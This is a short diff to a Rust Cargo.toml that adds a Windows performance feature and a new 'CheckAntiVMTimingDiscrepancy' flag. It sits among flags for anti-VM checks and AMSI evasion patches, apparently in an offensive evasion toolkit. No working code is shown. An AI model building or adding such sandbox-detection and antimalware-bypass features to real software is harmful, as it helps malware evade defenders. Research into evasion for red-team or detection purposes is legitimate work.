@@ -48,6 +48,7 @@ features = [
     "Win32_System_Registry",
     "Win32_System_Kernel",
     "Win32_System_WindowsProgramming",
+    "Win32_System_Performance",
 ]
 
 [features]
@@ -116,6 +117,7 @@ CheckAntiVMResolution = ["windows-sys"]
 CheckAntiVMFan = ["wmi", "windows-sys"]
 CheckAntiVMComprehensive = ["windows-sys"]
 CheckAntiVMICMP = ["windows-sys"]
+CheckAntiVMTimingDiscrepancy = ["windows-sys"]
 CheckDomainJoined = ["windows-sys"]
 EvasionAMSISimplePatch = ["windows-sys", "rust_syscalls"]
 EvasionAMSIHwbp = ["windows-sys"]
